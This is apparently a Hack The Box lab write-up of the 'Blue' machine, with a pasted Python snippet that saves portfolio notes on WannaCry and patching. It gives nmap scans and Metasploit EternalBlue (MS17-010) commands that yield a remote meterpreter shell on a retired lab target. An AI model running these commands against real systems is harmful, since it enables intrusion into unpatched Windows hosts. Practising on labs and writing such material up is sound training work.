# 🖥️ HTB Blue Writeup

**✳️ Box:** Blue  
**✳️ OS:** Windows  
**✳️ Difficulty:** Easy  

---

## 🔍 Enumeration

```bash
nmap -A 10.10.10.40
```

**Discovered open ports:**

```bash
PORT     STATE SERVICE      VERSION  
135/tcp  open  msrpc        Microsoft Windows RPC  
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn  
445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1
```

### 🧠 Observations:
- SMB is active on ports `139` and `445`.
- Target OS appears to be vulnerable to `ms17-010` (EternalBlue).

---

## 🔧 Vulnerability Scanning

```bash
nmap --script vuln -p 445 10.10.10.40
```

```bash
smb-vuln-ms17-010:  
  VULNERABLE:  
  Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
  State: VULNERABLE
```

---

## ⚔️ Exploitation

```bash
msfconsole
```

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST 10.10.14.XX   # ← your tun0 IP
run
```

### ✅ Result:
You should receive a meterpreter shell confirming remote access.

---

## 🏁 Flags

- `User.txt`: ✅  
- `Root.txt`: ✅  

---

## 📸 Screenshots

| 🔎 Nmap Scan        | 🎯 Vulnerability Detected     | 💥 Exploitation via Metasploit |
|--------------------|-------------------------------|-------------------------------|
| ![nmap](../screenshots/blue-nmap.png) | ![vuln](../screenshots/blue-smb-vuln.png) | ![exploit](../screenshots/blue-exploit-msf.png) |

---

## 💡 Takeaways

- EternalBlue is still relevant in vulnerable legacy systems.
- Enumeration is key — SMB exposure quickly led to exploit confirmation.
- Exploiting known vulnerabilities can yield immediate results on retired HTB machines, but don’t skip recon!

---

## ⌨️ Commands Summary (cloudpunchr@kali)

```bash
cd ~/Pentest_Vault/HTB_Blue
nmap -A 10.10.10.40
nmap --script vuln -p 445 10.10.10.40
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST 10.10.14.XX
run
```
from pathlib import Path

# Create a Markdown file with just the Real-World Relevance and Lessons Learned sections
summary_md = """\
## 💡 Real-World Relevance: Why This Exploit Matters

*HTB Blue* may be an entry-level box, but it mirrors one of the most impactful real-world exploits—**EternalBlue (MS17-010)**—used in the **WannaCry** ransomware attacks that crippled hospitals worldwide in 2017.

As a former **Clinical Application Specialist** in a major healthcare system, I’ve seen how legacy infrastructure and delayed patching can leave critical environments vulnerable. This write-up reflects not just the technical exploitation of an SMBv1 flaw, but the broader risks tied to operational downtime and poor system hygiene in sectors where reliability is non-negotiable.

By including this in my portfolio, I’m showcasing how I connect offensive security skills to real-world impact—especially in industries where cybersecurity isn’t just about data, but about continuity of care.

---

## ✅ Lessons Learned

- Even "easy" vulnerabilities can have **devastating real-world consequences** when unpatched.
- **Legacy protocols** like SMBv1 remain a soft target in outdated environments.
- **Healthcare systems**, often reliant on legacy applications, are prime targets for ransomware.
- **Patch management and segmentation** are vital to protect critical infrastructure.
- EternalBlue highlights the importance of **blue and red team collaboration**—knowing the exploit path helps inform the defense.
- Practicing with real-world exploits sharpens both offensive and risk assessment skills.
"""

# Save it to a markdown file
summary_path = Path("/mnt/data/HTB_Blue_Relevance_Lessons.md")
summary_path.write_text(summary_md)

summary_path.name  # Output file name for user reference
